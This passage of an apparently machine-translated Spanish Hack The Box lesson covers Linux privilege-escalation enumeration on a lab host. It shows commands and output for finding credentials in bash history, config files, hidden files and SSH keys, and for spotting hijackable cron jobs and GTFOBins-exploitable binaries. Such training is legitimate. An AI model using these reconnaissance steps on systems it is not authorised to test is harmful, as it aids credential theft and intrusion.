Cada usuario en sistemas Linux se asigna a un grupo o grupos específicos y, por lo tanto, recibe privilegios especiales. Por ejemplo, si tenemos una carpeta con nombre `dev` solo para desarrolladores, se debe asignar un usuario al grupo apropiado para acceder a esa carpeta. La información sobre los grupos disponibles se puede encontrar en el `/etc/group` archivo, que nos muestra tanto el nombre del grupo como los nombres de usuario asignados.

#### Grupos Existentes

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ cat /etc/group

root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,htb-student
tty:x:5:syslog
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:htb-student
floppy:x:25:
tape:x:26:
sudo:x:27:mrb3n,htb-student
audio:x:29:pulse
dip:x:30:htb-student
www-data:x:33:
...SNIP...
```

El `/etc/group` el archivo enumera todos los grupos en el sistema. Entonces podemos usar el [getent](https://man7.org/linux/man-pages/man1/getent.1.html) comando para enumerar miembros de cualquier grupo interesante.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ getent group sudo

sudo:x:27:mrb3n
```

También podemos ver qué usuarios tienen una carpeta debajo del `/home` directorio. Queremos enumerar cada uno de estos para ver si alguno de los usuarios del sistema está almacenando datos confidenciales, archivos que contienen contraseñas. Deberíamos comprobar si archivos como el `.bash_history`los archivos son legibles y contienen comandos interesantes y buscan archivos de configuración. No es raro encontrar archivos que contengan credenciales que puedan aprovecharse para acceder a otros sistemas o incluso obtener acceso al entorno de Active Directory. También es importante verificar las claves SSH para todos los usuarios, ya que podrían usarse para lograr persistencia en el sistema, potencialmente para escalar privilegios o para ayudar a pivotar y reenviar puertos aún más en la red interna. Como mínimo, verifique la caché de ARP para ver a qué otros hosts se accede y haga referencia cruzada a ellos con cualquier clave privada SSH utilizable.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ ls /home

administrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins
backupsvc                cliff.moore  logger       shared
```

Por último, podemos buscar cualquier "fruta de bajo contenido", como archivos de configuración, y otros archivos que pueden contener información confidencial. Los archivos de configuración pueden contener una gran cantidad de información. Vale la pena buscar en todos los archivos que terminan en extensiones como .conf y .config, nombres de usuario, contraseñas y otros secretos.

Si hemos recopilado alguna contraseña, deberíamos probarla en este momento para todos los usuarios presentes en el sistema. ¡La reutilización de contraseñas es común, por lo que podríamos tener suerte!

En Linux, hay muchos lugares diferentes donde se pueden almacenar dichos archivos, incluidos los sistemas de archivos montados. Un sistema de archivos montado es un sistema de archivos que se adjunta a un directorio particular en el sistema y se accede a través de ese directorio. Se pueden montar muchos sistemas de archivos, como ext4, NTFS y FAT32. Cada tipo de sistema de archivos tiene sus propios beneficios e inconvenientes. Por ejemplo, algunos sistemas de archivos solo pueden ser leídos por el sistema operativo, mientras que otros pueden ser leídos y escritos por el usuario. Los sistemas de archivos que el usuario puede leer y escribir se denominan sistemas de archivos de lectura/escritura. Montar un sistema de archivos permite al usuario acceder a los archivos y carpetas almacenados en ese sistema de archivos. Para montar un sistema de archivos, el usuario debe tener privilegios de root. Una vez que se monta un sistema de archivos, el usuario puede desmontarlo con privilegios de root.Es posible que tengamos acceso a dichos sistemas de archivos y podamos encontrar información confidencial, documentación o aplicaciones allí.

#### Sistemas de Archivos Montados

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ df -h

Filesystem      Size  Used Avail Use% Mounted on
udev            1,9G     0  1,9G   0% /dev
tmpfs           389M  1,8M  388M   1% /run
/dev/sda5        20G  7,9G   11G  44% /
tmpfs           1,9G     0  1,9G   0% /dev/shm
tmpfs           5,0M  4,0K  5,0M   1% /run/lock
tmpfs           1,9G     0  1,9G   0% /sys/fs/cgroup
/dev/loop0      128K  128K     0 100% /snap/bare/5
/dev/loop1       62M   62M     0 100% /snap/core20/1611
/dev/loop2       92M   92M     0 100% /snap/gtk-common-themes/1535
/dev/loop4       55M   55M     0 100% /snap/snap-store/558
/dev/loop3      347M  347M     0 100% /snap/gnome-3-38-2004/115
/dev/loop5       47M   47M     0 100% /snap/snapd/16292
/dev/sda1       511M  4,0K  511M   1% /boot/efi
tmpfs           389M   24K  389M   1% /run/user/1000
/dev/sr0        3,6G  3,6G     0 100% /media/htb-student/Ubuntu 20.04.5 LTS amd64
/dev/loop6       50M   50M     0 100% /snap/snapd/17576
/dev/loop7       64M   64M     0 100% /snap/core20/1695
/dev/loop8       46M   46M     0 100% /snap/snap-store/599
/dev/loop9      347M  347M     0 100% /snap/gnome-3-38-2004/119
```

Cuando se desmonta un sistema de archivos, el sistema ya no puede acceder a él. Esto se puede hacer por varias razones, como cuando se quita un disco o ya no se necesita un sistema de archivos. Otra razón puede ser que los archivos, scripts, documentos y otra información importante no deben ser montados y vistos por un usuario estándar. Por lo tanto, si podemos extender nuestros privilegios a la `root` usuario, podríamos montar y leer estos sistemas de archivos nosotros mismos. Los sistemas de archivos no montados se pueden ver de la siguiente manera:

#### Sistemas de Archivos Desmontados

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ cat /etc/fstab | grep -v "#" | column -t

UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1
UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1
/swapfile                                  none       swap  sw                 0  0
```

Muchas carpetas y archivos se mantienen ocultos en un sistema Linux, por lo que no son obvios y se evita la edición accidental. Por qué tales archivos y carpetas se mantienen ocultos, hay muchas más razones que las mencionadas hasta ahora. Sin embargo, debemos poder localizar todos los archivos y carpetas ocultos porque a menudo pueden contener información confidencial, incluso si tenemos permisos de solo lectura.

#### Todos los Archivos Ocultos

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student

-rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc
-rw-rw-r-- 1 htb-student htb-student 180 Nov 27 11:36 /home/htb-student/.wget-hsts
-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
-rw-r--r-- 1 htb-student htb-student 807 Nov 27 11:16 /home/htb-student/.profile
-rw-r--r-- 1 htb-student htb-student 0 Nov 27 11:31 /home/htb-student/.sudo_as_admin_successful
-rw-r--r-- 1 htb-student htb-student 220 Nov 27 11:16 /home/htb-student/.bash_logout
-rw-rw-r-- 1 htb-student htb-student 162 Nov 28 13:26 /home/htb-student/.notes
```

#### Todos los Directorios Ocultos

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ find / -type d -name ".*" -ls 2>/dev/null

   684822      4 drwx------   3 htb-student htb-student     4096 Nov 28 12:32 /home/htb-student/.gnupg
   790793      4 drwx------   2 htb-student htb-student     4096 Okt 27 11:31 /home/htb-student/.ssh
   684804      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.cache
   790827      4 drwxrwxr-x   8 htb-student htb-student     4096 Okt 27 11:32 /home/htb-student/CVE-2021-3156/.git
   684796      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.config
   655426      4 drwxr-xr-x   3 htb-student htb-student     4096 Okt 27 11:19 /home/htb-student/.local
   524808      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.cache
   544027      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.config
   544028      4 drwxr-xr-x   3 gdm         gdm             4096 Aug 31 08:54 /var/lib/gdm3/.local
   524938      4 drwx------   2 colord      colord          4096 Okt 27 11:19 /var/lib/colord/.cache
     1408      2 dr-xr-xr-x   1 htb-student htb-student     2048 Aug 31 09:17 /media/htb-student/Ubuntu\ 20.04.5\ LTS\ amd64/.disk
   280101      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.font-unix
   262364      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.ICE-unix
   262362      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.X11-unix
   280103      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.Test-unix
   262830      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.XIM-unix
   661820      4 drwxr-xr-x   5 root        root            4096 Aug 31 08:55 /usr/lib/modules/5.15.0-46-generic/vdso/.build-id
   666709      4 drwxr-xr-x   5 root        root            4096 Okt 27 11:18 /usr/lib/modules/5.15.0-52-generic/vdso/.build-id
   657527      4 drwxr-xr-x 170 root        root            4096 Aug 31 08:55 /usr/lib/debug/.build-id
```

Además, tres carpetas predeterminadas están destinadas a archivos temporales. Estas carpetas son visibles para todos los usuarios y se pueden leer. Además, los registros temporales o la salida de script se pueden encontrar allí. Ambos `/tmp` y `/var/tmp` se utilizan para almacenar datos temporalmente. Sin embargo, la diferencia clave es cuánto tiempo se almacenan los datos en estos sistemas de archivos. El tiempo de retención de datos para `/var/tmp` es mucho más largo que el de la `/tmp` directorio. De forma predeterminada, todos los archivos y datos almacenados en /var/tmp se conservan hasta por 30 días. En /tmp, por otro lado, los datos se eliminan automáticamente después de diez días.

Además, todos los archivos temporales almacenados en el `/tmp` el directorio se elimina inmediatamente cuando se reinicia el sistema. Por lo tanto, el `/var/tmp` el directorio es utilizado por los programas para almacenar datos que deben mantenerse entre reinicios temporalmente.

#### Archivos Temporales

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ ls -l /tmp /var/tmp /dev/shm

/dev/shm:
total 0

/tmp:
total 52
-rw------- 1 htb-student htb-student    0 Nov 28 12:32 config-err-v8LfEU
drwx------ 3 root        root        4096 Nov 28 12:37 snap.snap-store
drwx------ 2 htb-student htb-student 4096 Nov 28 12:32 ssh-OKlLKjlc98xh
<SNIP>
drwx------ 2 htb-student htb-student 4096 Nov 28 12:37 tracker-extract-files.1000
drwx------ 2 gdm         gdm         4096 Nov 28 12:31 tracker-extract-files.125

/var/tmp:
total 28
drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-colord.service-RrPcyi
drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-ModemManager.service-4Rej9e
...SNIP...
```

---

## Avanzando

Hemos obtenido una disposición inicial de la tierra y (esperemos) algunos puntos de datos sensibles o útiles que pueden ayudarnos en nuestro camino hacia la escalada de privilegios o incluso a movernos lateralmente en la red interna. A continuación, centraremos nuestro enfoque en los permisos y verificaremos qué directorios, scripts, binarios, etc., podemos leer y escribir con nuestros privilegios de usuario actuales.

Aunque nos estamos centrando en la enumeración manual en este módulo, vale la pena ejecutar el [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) script en este punto en una evaluación del mundo real para que tengamos tantos datos para explorar como sea posible. A menudo podemos encontrar una victoria fácil, pero tener este resultado a mano a veces puede descubrir problemas matizados que nuestra enumeración manual se perdió. Sin embargo, deberíamos practicar nuestra enumeración manual tanto como sea posible y crear (y continuar agregando) nuestra propia hoja de trucos de comandos clave (y alternativas para diferentes sistemas operativos Linux). Comenzaremos a desarrollar nuestro propio estilo, preferencia de comando e incluso veremos algunas áreas que podemos comenzar a escribir nosotros mismos. Las herramientas son geniales y tienen su lugar, pero donde muchas se quedan cortas es poder realizar una tarea determinada cuando una herramienta falla o no podemos ponerla en el sistema.


# Servicios Linux y Enumeración de Internos

---

Ahora que hemos excavado en el entorno y hemos conseguido la disposición de la tierra y hemos descubierto lo más posible sobre nuestros permisos de usuario y grupo en lo que respecta a archivos, scripts, binarios, directorios, etc., llevaremos las cosas un paso más allá y profundizaremos en las partes internas del sistema operativo host. En esta fase enumeraremos lo siguiente que ayudará a informar muchos de los ataques discutidos en las secciones posteriores de este módulo.

- ¿Qué servicios y aplicaciones están instalados?
    
- ¿Qué servicios se están ejecutando?
    
- ¿Qué enchufes están en uso?
    
- ¿Qué usuarios, administradores y grupos existen en el sistema?
    
- ¿Quién ha iniciado sesión? ¿Qué usuarios han iniciado sesión recientemente?
    
- ¿Qué políticas de contraseña, si las hay, se aplican en el host?
    
- ¿El host está unido a un dominio de Active Directory?
    
- Qué tipos de información interesante podemos encontrar en el historial, el registro y los archivos de copia de seguridad
    
- ¿Qué archivos se han modificado recientemente y con qué frecuencia? ¿Hay algún patrón interesante en la modificación de archivos que pueda indicar un trabajo cron en uso que podamos secuestrar?
    
- Información actual de direccionamiento IP
    
- Cualquier cosa interesante en el `/etc/hosts` ¿archivo?
    
- ¿Hay alguna conexión de red interesante a otros sistemas en la red interna o incluso fuera de la red?
    
- ¿Qué herramientas están instaladas en el sistema que podamos aprovechar? (Netcat, Perl, Python, Ruby, Nmap, tcpdump, gcc, etc)
    
- Podemos acceder al `bash_history` archivo para cualquier usuario y ¿podemos descubrir algo interesante de su historial de líneas de comandos grabadas, como contraseñas?
    
- ¿Hay trabajos de Cron ejecutándose en el sistema que podamos secuestrar?
    

En este momento también queremos recopilar tanta información de red como sea posible. ¿Cuál es nuestra dirección IP actual? ¿El sistema tiene otras interfaces y, por lo tanto, podría usarse para pivotar en otra subred que antes era inalcanzable desde nuestro host de ataque? Hacemos esto con el `ip a` comando o `ifconfig`, pero este comando a veces no funcionará en ciertos sistemas si el [herramientas de red](https://packages.ubuntu.com/search?keywords=net-tools) el paquete no está presente.

---

## Internos

Cuando hablamos de la `internals`nos referimos a la configuración interna y la forma de trabajar, incluidos los procesos integrados diseñados para realizar tareas específicas. Así que comenzamos con las interfaces a través de las cuales nuestro sistema de destino puede comunicarse.

#### Interfaces de Red

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ ip a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:ed:2a brd ff:ff:ff:ff:ff:ff
    inet 10.129.203.168/16 brd 10.129.255.255 scope global dynamic ens192
       valid_lft 3092sec preferred_lft 3092sec
    inet6 dead:beef::250:56ff:feb9:ed2a/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:ed2a/64 scope link 
       valid_lft forever preferred_lft forever
```

Hay algo interesante en el `/etc/hosts` ¿archivo?

#### Anfitriones

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ cat /etc/hosts

127.0.0.1 localhost
127.0.1.1 nixlpe02
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

También puede ser útil consultar el último tiempo de inicio de sesión de cada usuario para intentar ver cuándo los usuarios suelen iniciar sesión en el sistema y con qué frecuencia. Esto puede darnos una idea de cuán ampliamente utilizado es este sistema que puede abrir el potencial de más configuraciones erróneas o directorios "mensuales" o historiales de comandos.

#### Último inicio de sesión del Usuario

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ lastlog

Username         Port     From             Latest
root                                       **Never logged in**
daemon                                     **Never logged in**
bin                                        **Never logged in**
sys                                        **Never logged in**
sync                                       **Never logged in**
...SNIP...
systemd-coredump                           **Never logged in**
mrb3n            pts/1    10.10.14.15      Tue Aug  2 19:33:16 +0000 2022
lxd                                        **Never logged in**
bjones                                     **Never logged in**
administrator.ilfreight                           **Never logged in**
backupsvc                                  **Never logged in**
cliff.moore      pts/0    127.0.0.1        Tue Aug  2 19:32:29 +0000 2022
logger                                     **Never logged in**
shared                                     **Never logged in**
stacey.jenkins   pts/0    10.10.14.15      Tue Aug  2 18:29:15 +0000 2022
htb-student      pts/0    10.10.14.15      Wed Aug  3 13:37:22 +0000 2022                          
```

Además, veamos si alguien más está actualmente en el sistema con nosotros. Hay algunas maneras de hacer esto, como el `who` comando. El `finger` el comando funcionará para mostrar esta información en algunos sistemas Linux. Podemos ver que el `cliff.moore` el usuario ha iniciado sesión en el sistema con nosotros.

#### Usuarios Iniciados sesión

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ w

 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash
```

También es importante verificar el historial de bash de un usuario, ya que pueden estar pasando contraseñas como un argumento en la línea de comandos, trabajando con repositorios git, configurando trabajos cron y más. Revisar lo que el usuario ha estado haciendo puede darle una visión considerable del tipo de servidor en el que aterriza y dar una pista sobre las rutas de escalada de privilegios.

#### Historia de Comando

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ history

    1  id
    2  cd /home/cliff.moore
    3  exit
    4  touch backup.sh
    5  tail /var/log/apache2/error.log
    6  ssh ec2-user@dmz02.inlanefreight.local
    7  history
```

A veces también podemos encontrar archivos de historial especiales creados por scripts o programas. Esto se puede encontrar, entre otros, en scripts que monitorean ciertas actividades de los usuarios y verifican actividades sospechosas.

#### Encontrar Archivos de Historial

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
```

También es una buena idea verificar si hay trabajos de cron en el sistema. Los trabajos de Cron en sistemas Linux son similares a las tareas programadas de Windows. A menudo se configuran para realizar tareas de mantenimiento y respaldo. Junto con otras configuraciones erróneas, como rutas relativas o permisos débiles, pueden aprovechar para escalar privilegios cuando se ejecuta el trabajo cron programado.

#### Cron

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ ls -la /etc/cron.daily/

total 48
drwxr-xr-x  2 root root 4096 Aug  2 17:36 .
drwxr-xr-x 96 root root 4096 Aug  2 19:34 ..
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common
```

El [pro sistema de archivos](https://man7.org/linux/man-pages/man5/proc.5.html) (`proc` / `procfs`) es un sistema de archivos en particular en Linux que contiene información sobre los procesos del sistema, hardware y otra información del sistema. Es la forma principal de acceder a la información del proceso y se puede utilizar para ver y modificar la configuración del kernel. Es virtual y no existe como un sistema de archivos real, sino que es generado dinámicamente por el kernel. Se puede usar para buscar información del sistema, como el estado de los procesos en ejecución, los parámetros del kernel, la memoria del sistema y los dispositivos. También establece ciertos parámetros del sistema, como la prioridad del proceso, la programación y la asignación de memoria.

#### Proc

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

...SNIP...
startups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:
htb-student
[priv]sshd:
htb-student
[priv]/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.ssh/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.sshsshd:
htb-student@pts/2sshd:
```

---

## Servicios

Si se trata de un sistema Linux un poco más antiguo, aumenta la probabilidad de que podamos encontrar paquetes instalados que ya puedan tener al menos una vulnerabilidad. Sin embargo, las versiones actuales de las distribuciones de Linux también pueden tener paquetes o software más antiguos instalados que pueden tener tales vulnerabilidades. Por lo tanto, veremos un método para ayudarnos a detectar paquetes potencialmente peligrosos en un momento. Para hacer esto, primero necesitamos crear una lista de paquetes instalados para trabajar.

#### Paquetes Instalados

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

Listing...                                                 
accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                                                          
accountsservice 0.6.55-0ubuntu12~20.04.5                   
acl 2.2.53-6                                               
acpi-support 0.143                                         
acpid 2.0.32-1ubuntu1                                      
adduser 3.118ubuntu2                                       
adwaita-icon-theme 3.36.1-2ubuntu0.20.04.2                 
alsa-base 1.0.25+dfsg-0ubuntu5                             
alsa-topology-conf 1.2.2-1                                                                                            
alsa-ucm-conf 1.2.2-1ubuntu0.13                            
alsa-utils 1.2.2-1ubuntu2.1                                                                                           
amd64-microcode 3.20191218.1ubuntu1
anacron 2.3-29
apg 2.2.3.dfsg.1-5
app-install-data-partner 19.04
apparmor 2.13.3-7ubuntu5.1
apport-gtk 2.20.11-0ubuntu27.24
apport-symptoms 0.23
apport 2.20.11-0ubuntu27.24
appstream 0.12.10-2
apt-config-icons-hidpi 0.12.10-2
apt-config-icons 0.12.10-2
apt-utils 2.0.9
...SNIP...
```

También es una buena idea comprobar si el `sudo` la versión instalada en el sistema es vulnerable a cualquier legado o exploits recientes.

#### Versión Sudo

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ sudo -V

Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

Ocasionalmente también puede suceder que no se instalen paquetes directos en el sistema, sino programas compilados en forma de binarios. Estos no requieren instalación y pueden ser ejecutados directamente por el propio sistema.

#### Binarios

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/

lrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -> usr/bin

/usr/bin/:
total 175160
-rwxr-xr-x 1 root root       31248 May 19  2020  aa-enabled
-rwxr-xr-x 1 root root       35344 May 19  2020  aa-exec
-rwxr-xr-x 1 root root       22912 Apr 14  2021  aconnect
-rwxr-xr-x 1 root root       19016 Nov 28  2019  acpi_listen
-rwxr-xr-x 1 root root        7415 Oct 26  2021  add-apt-repository
-rwxr-xr-x 1 root root       30952 Feb  7  2022  addpart
lrwxrwxrwx 1 root root          26 Oct 20  2021  addr2line -> x86_64-linux-gnu-addr2line
...SNIP...

/usr/sbin/:
total 32500
-rwxr-xr-x 1 root root      3068 Mai 19  2020 aa-remove-unknown
-rwxr-xr-x 1 root root      8839 Mai 19  2020 aa-status
-rwxr-xr-x 1 root root       139 Jun 18  2019 aa-teardown
-rwxr-xr-x 1 root root     14728 Feb 25  2020 accessdb
-rwxr-xr-x 1 root root     60432 Nov 28  2019 acpid
-rwxr-xr-x 1 root root      3075 Jul  4 18:20 addgnupghome
lrwxrwxrwx 1 root root         7 Okt 27 11:14 addgroup -> adduser
-rwxr-xr-x 1 root root       860 Dez  7  2019 add-shell
-rwxr-xr-x 1 root root     37785 Apr 16  2020 adduser
-rwxr-xr-x 1 root root     69000 Feb  7  2022 agetty
-rwxr-xr-x 1 root root      5576 Jul 31  2015 alsa
-rwxr-xr-x 1 root root      4136 Apr 14  2021 alsabat-test
-rwxr-xr-x 1 root root    118176 Apr 14  2021 alsactl
-rwxr-xr-x 1 root root     26489 Apr 14  2021 alsa-info
-rwxr-xr-x 1 root root     39088 Jul 16  2019 anacron
...SNIP...
```

[GTFObinas](https://gtfobins.github.io/) proporciona una excelente plataforma que incluye una lista de binarios que potencialmente pueden ser explotados para escalar nuestros privilegios en el sistema de destino. Con el próximo oneliner, podemos comparar los binarios existentes con los de GTFObins para ver qué binarios debemos investigar más adelante.

#### GTFObinas

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

Check GTFO for: ab                                         
Check GTFO for: apt                                        
Check GTFO for: ar                                         
Check GTFO for: as         
Check GTFO for: ash                                        
Check GTFO for: aspell                                     
Check GTFO for: at     
Check GTFO for: awk      
Check GTFO for: bash                                       
Check GTFO for: bridge
Check GTFO for: busybox
Check GTFO for: bzip2
Check GTFO for: cat
Check GTFO for: comm
Check GTFO for: cp
Check GTFO for: cpio
Check GTFO for: cupsfilter
Check GTFO for: curl
Check GTFO for: dash
Check GTFO for: date
Check GTFO for: dd
Check GTFO for: diff
```

Podemos utilizar la herramienta de diagnóstico `strace` en sistemas operativos basados en Linux para rastrear y analizar llamadas al sistema y procesamiento de señales. Nos permite seguir el flujo de un programa y comprender cómo accede a los recursos del sistema, procesa las señales y recibe y envía datos desde el sistema operativo. Además, también podemos usar la herramienta para monitorear actividades relacionadas con la seguridad e identificar posibles vectores de ataque, como solicitudes específicas a hosts remotos utilizando contraseñas o tokens.

La salida de `strace` se puede escribir en un archivo para su posterior análisis, y proporciona una gran cantidad de opciones que permiten un seguimiento detallado del comportamiento del programa.

#### Llamadas al Sistema de Rastreo

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ strace ping -c1 10.129.112.20

execve("/usr/bin/ping", ["ping", "-c1", "10.129.112.20"], 0x7ffdc8b96cc0 /* 80 vars */) = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
brk(NULL)                               = 0x56222584c000
arch_prctl(0x3001 /* ARCH_??? */, 0x7fffb0b2ea00) = -1 EINVAL (Invalid argument)
...SNIP...
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
...SNIP...
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libidn2.so.0", O_RDONLY|O_CLOEXEC) = 3
...SNIP...
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
pread64(3, "\4\0\0\0 \0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0"..., 48, 848) = 48
...SNIP...
socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3
socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6) = 4
capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, NULL) = 0
capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, {effective=0, permitted=0, inheritable=0}) = 0
openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache", O_RDONLY) = 5
...SNIP...
socket(AF_INET, SOCK_DGRAM, IPPROTO_IP) = 5
connect(5, {sa_family=AF_INET, sin_port=htons(1025), sin_addr=inet_addr("10.129.112.20")}, 16) = 0
getsockname(5, {sa_family=AF_INET, sin_port=htons(39885), sin_addr=inet_addr("10.129.112.20")}, [16]) = 0
close(5)                                = 0
...SNIP...
sendto(3, "\10\0\31\303\0\0\0\1eX\327c\0\0\0\0\330\254\n\0\0\0\0\0\20\21\22\23\24\25\26\27"..., 64, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("10.129.112.20")}, 16) = 64
...SNIP...
recvmsg(3, {msg_name={sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("10.129.112.20")}, msg_namelen=128 => 16, msg_iov=[{iov_base="\0\0!\300\0\3\0\1eX\327c\0\0\0\0\330\254\n\0\0\0\0\0\20\21\22\23\24\25\26\27"..., iov_len=192}], msg_iovlen=1, msg_control=[{cmsg_len=32, cmsg_level=SOL_SOCKET, cmsg_type=SO_TIMESTAMP_OLD, cmsg_data={tv_sec=1675057253, tv_usec=699895}}, {cmsg_len=20, cmsg_level=SOL_IP, cmsg_type=IP_TTL, cmsg_data=[64]}], msg_controllen=56, msg_flags=0}, 0) = 64
write(1, "64 bytes from 10.129.112.20: icmp_se"..., 57) = 57
write(1, "\n", 1)                       = 1
write(1, "--- 10.129.112.20 ping statistics --"..., 34) = 34
write(1, "1 packets transmitted, 1 receive"..., 60) = 60
write(1, "rtt min/avg/max/mdev = 0.287/0.2"..., 50) = 50
close(1)                                = 0
close(2)                                = 0
exit_group(0)                           = ?
+++ exited with 0 +++
```

Los usuarios pueden leer casi todos los archivos de configuración en un sistema operativo Linux si el administrador los ha mantenido iguales. Estos archivos de configuración a menudo pueden revelar cómo se configura y configura el servicio para comprender mejor cómo podemos usarlo para nuestros propósitos. Además, estos archivos pueden contener información sensible, como claves y rutas a archivos en carpetas que no podemos ver. Sin embargo, si el archivo tiene permisos de lectura para todos, aún podemos leer el archivo incluso si no tenemos permiso para leer la carpeta.

#### Archivos de Configuración

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf
